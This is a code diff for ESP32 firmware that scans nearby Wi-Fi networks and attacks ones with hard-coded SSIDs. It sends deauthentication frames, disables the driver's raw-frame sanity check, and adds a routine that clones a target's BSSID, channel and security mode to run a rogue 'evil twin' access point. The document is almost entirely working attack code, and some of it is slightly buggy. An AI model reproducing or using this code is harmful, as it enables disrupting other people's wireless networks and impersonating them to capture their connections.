@@ -14,11 +14,14 @@ extern "C" {
 #include "packet.hpp"
 #include <cstring>
 
+
 #define TASK_NAME "spam_task"
 
 PacketSender sender;
 wifi_ap_record_t *apRecords;
 void deauth_task(MacAddr bssid, uint8_t prim_chan);
+void attack_method_rogueap(wifi_ap_record_t* ap_record);
+
 
     // PARAMETRO .authmode
 static void print_auth_mode(int authmode)
@@ -154,30 +157,22 @@ void spoofMAC(MacAddr* pMAC ){
 //esp_err_t esp_wifi_scan_start(const wifi_scan_config_t *config, bool block)
 //esp_err_t esp_wifi_scan_stop(void)
 //esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)
+
 void scanWifi(void *pvParameter){
     
     ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
     while(1){
+
+
         ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
         vTaskDelay(1000 / portTICK_PERIOD_MS);
-        //ESP_LOGI(TASK_NAME, "prima di scan_start");
-
         esp_wifi_scan_start(NULL,true);
-        //ESP_LOGI(TASK_NAME, "dopo scan_start");
-
         esp_wifi_scan_stop();
-        //ESP_LOGI(TASK_NAME, "dopo scan_stop");
-
         uint16_t maxAP = 15; //arbitrary number max APs stored
         esp_wifi_scan_get_ap_num(&maxAP);
         uint16_t AP_num = maxAP;
         apRecords = new wifi_ap_record_t[maxAP];
-        //ESP_LOGI(TASK_NAME, "prima di get_ap_record");
-        //ESP_LOGI(TASK_NAME, "maxAP: %d", maxAP);
         esp_wifi_scan_get_ap_records(&maxAP , apRecords);
-        //ESP_LOGI(TASK_NAME, "dopo get_ap_records");
-
-        //ESP_LOGI(TASK_NAME, "maxAP: %d", maxAP);
         
         for(int i=0;i < AP_num;i++){
             ESP_LOGI(TASK_NAME, "SSID: %s", apRecords[i].ssid);
@@ -186,9 +181,10 @@ void scanWifi(void *pvParameter){
             print_auth_mode(apRecords[i].authmode);
             ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
             ESP_LOGI(TASK_NAME, "########################################\n");
-            if(!strcmp("Xiaomi 11T Pro", (char *)apRecords[i].ssid)){
+            if(!strcmp("Xiaomi 11T Pro", (char *)apRecords[i].ssid) || !strcmp("Gama", (char *)apRecords[i].ssid)){
                 ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK\n");
-                deauth_task(apRecords[i].bssid,apRecords[i].primary);
+                //deauth_task(apRecords[i].bssid,apRecords[i].primary);
+                attack_method_rogueap(&apRecords[i]);
             }
         }
         
@@ -196,10 +192,12 @@ void scanWifi(void *pvParameter){
     }
 }
 
-
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
 }
+
+
+
 
 
 void deauth_task(MacAddr bssid, uint8_t prim_chan) {
@@ -229,27 +227,42 @@ void deauth_task(MacAddr bssid, uint8_t prim_chan) {
         //re place with your AP's mac address
         //98:ca:33
         0x98, 0xca, 0x33, 0x32, 0x65, 0xe4
-
+    };
 
     
     //08 b6 1f 3b 3c 54
-    spoofMAC(&AP);
+    //spoofMAC(&AP);
     ESP_LOGI(TASK_NAME, "dopo spoof MAC");
     //ESP_ERROR_CHECK(esp_wifi_set_mac(,AP));
     
-
     esp_err_t res;
 
-    while(1){
-        res = sender.deauth(TARGET, AP, bssid, 1, prim_chan);
-        ESP_LOGI(TASK_NAME, "dopo sender.deauth");
-        
-        ESP_LOGI(TASK_NAME," RES:  %s\n", esp_err_to_name(res));
-        
-        vTaskDelay(5000 / portTICK_PERIOD_MS);
-    }
+    
+    res = sender.deauth(TARGET, AP, bssid, 1, prim_chan);
+    ESP_LOGI(TASK_NAME, "dopo sender.deauth");
+    
+    ESP_LOGI(TASK_NAME," RES:  %s\n", esp_err_to_name(res));
+    
+    vTaskDelay(5000 / portTICK_PERIOD_MS);
+
 }
 
+void attack_method_rogueap(wifi_ap_record_t *ap_record){
+    ESP_LOGD(TASK_NAME, "Configuring Rogue AP");
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_AP, ap_record->bssid));
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid_len = strlen((uint8_t *)ap_record->ssid),
+            .channel = ap_record->primary,
+            .authmode = ap_record->authmode,
+            .password = "dummypassword",
+            .max_connection = 1
+        }
+    };
+    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+}
 
 
 extern "C" void app_main(void) {
@@ -267,7 +280,7 @@ extern "C" void app_main(void) {
     // a mode where we can send the actual fake beacon frames.
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
 
-    //ESP_ERROR_CHECK(esp32_deauther_configure_wifi(1));
+    //ESP_ERRiOR_CHECK(esp32_deauther_configure_wfi(1));
 
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
     ESP_ERROR_CHECK(esp_wifi_start());
